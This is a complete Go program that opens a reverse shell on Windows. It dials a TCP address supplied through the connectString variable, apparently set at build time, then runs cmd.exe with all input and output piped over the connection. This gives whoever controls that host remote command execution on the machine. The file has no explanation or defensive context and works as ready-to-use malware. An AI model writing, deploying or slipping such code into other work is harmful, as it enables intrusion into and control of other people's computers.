package main

import (
	"net"
	"os"
	"os/exec"
)

var connectString string

func main() {
	if len(connectString) == 0 {
		os.Exit(1)
	}
	conn, err := net.Dial("tcp", connectString)
	if err != nil {
		os.Exit(1)
	}
	cmd := exec.Command("cmd.exe")
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}


